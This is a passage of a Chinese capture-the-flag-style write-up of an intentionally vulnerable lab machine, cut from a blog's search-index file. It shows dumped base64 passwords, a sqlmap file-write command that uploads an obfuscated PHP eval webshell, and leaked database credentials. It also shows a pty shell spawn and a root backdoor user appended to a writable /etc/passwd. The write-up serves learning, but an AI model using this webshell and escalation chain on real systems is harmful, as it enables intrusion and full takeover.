| userName  |+----+----------------------------------------------+-----------+| 1  | RmFrZVVzZXJQYXNzdzByZA==                     | t00r      || 2  | TXlFdmlsUGFzc19mOTA4c2RhZjlfc2FkZmFzZjBzYQ== | aiweb1pwn || 3  | TjB0VGhpczBuZUFsczA=                         | u3er      |+----+----------------------------------------------+-----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>base64解码为</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">FakeUserPassw0rdMyEvilPass_f908sdaf9_sadfasf0saN0tThis0neAls0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>我们这个用户有FILE权限<br><img src="/Rxi134_FILE/b3a8df81fe3d1eb20547bb74b882433e_MD5.jpeg"></p><p>要写马得获取绝对路径，一开始想sql shell执行SQL语句但好像没这个权限，不过前面的phpinfo界面可以直接看到绝对路径<br><img src="/Rxi134_FILE/45453dd1d872d71972c09c5a83632bbe_MD5.jpeg"></p><p>有权限写的位置只有 &#x2F;se3reTdir777&#x2F;uploads</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token string">"C:\Penetration<span class="token entity" title="\E">\E</span>xploitTools\Tools\Sqlmap\sqlmap.py"</span> <span class="token parameter variable">-r</span> <span class="token string">"C:\Users\ANONYM~1\AppData\Local\Temp<span class="token entity" title="\\">\\</span>192_168_50_137_80_20240802173240.req"</span> --file-write <span class="token string">"C:\Users\Anonymous\Desktop<span class="token entity" title="\202">\202</span>40802053947.php"</span> --file-dest <span class="token string">"/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/shell.php"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">GZ0lOZtq</span> <span class="token punctuation">&#123;</span> <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$H2qZ4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/*Z#��h*u@!h4g126854T*/"</span><span class="token operator">.</span><span class="token variable">$H2qZ4</span><span class="token operator">.</span><span class="token string double-quoted-string">"/*Z#��h*u@!h4g126854T*/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">new</span> <span class="token class-name">GZ0lOZtq</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hh'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>蚁剑连接即可<br><img src="/Rxi134_FILE/29dd7c51e3681c1c77d3f4b07a7c9b86_MD5.jpeg"></p><p>在目录下又发现一个连接数据库的文件<br><img src="/Rxi134_FILE/b93740173bc90fc25e9f1ce48c97dbfa_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">数据库地址 localhost账密 aiweb1user:wGuDisZiTkLhuiH_z_zZQXXi数据库名称 aiweb1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>先反弹 shell 到跳板机上，我用的是frp反向代理<br><img src="/Rxi134_FILE/cb7046293b85207636403285a4e46edc_MD5.jpeg"></p><p><img src="/Rxi134_FILE/9aff13a14073a24ba411dd1cfeda2acb_MD5.jpeg"></p><p>起一个伪终端，方便回显</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import pty; pty.spawn("/bin/sh") '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以正常登录mysql<br><img src="/Rxi134_FILE/fde2063f2d5db55cec9646e9af77a0d8_MD5.jpeg"></p><p>进行一些信息搜集，上lineas<br><img src="/Rxi134_FILE/c5784084ac53b01ea3d8577239d190ab_MD5.jpeg"></p><p>本用户对 &#x2F;etc&#x2F;passwd 有写权限<br><img src="/Rxi134_FILE/bf11baf48105c308ba73a35040d28755_MD5.jpeg"><br>创建一个新用户x1nri，密码为123</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ openssl <span class="token function">passwd</span> <span class="token parameter variable">-1</span> <span class="token parameter variable">-salt</span> x1nri <span class="token number">123</span><span class="token variable">$1</span><span class="token variable">$x1nri</span><span class="token variable">$RuLBMKXnN1w</span>.xtGk5bIT21<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>那么passwd条目为</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">x1nri:$1$x1nri$RuLBMKXnN1w.xtGk5bIT21:0:0:root:/root:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>追加重定向到末尾即可。记得转义$</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"x1nri:\<span class="token variable">$1</span>\<span class="token variable">$x1nri</span>\<span class="token variable">$RuLBMKXnN1w</span>.xtGk5bIT21:0:0:root:/root:/bin/bash"</span> <span class="token operator">>></span> /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/2dde81a003d363f0b9a2b03fca9564ce_MD5.jpeg"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过该靶机，我学习到了</p><ul><li>更加深入了解了sqlmap</li></ul>]]></content>
      
      
      <categories>
          
          <category> 进攻性渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
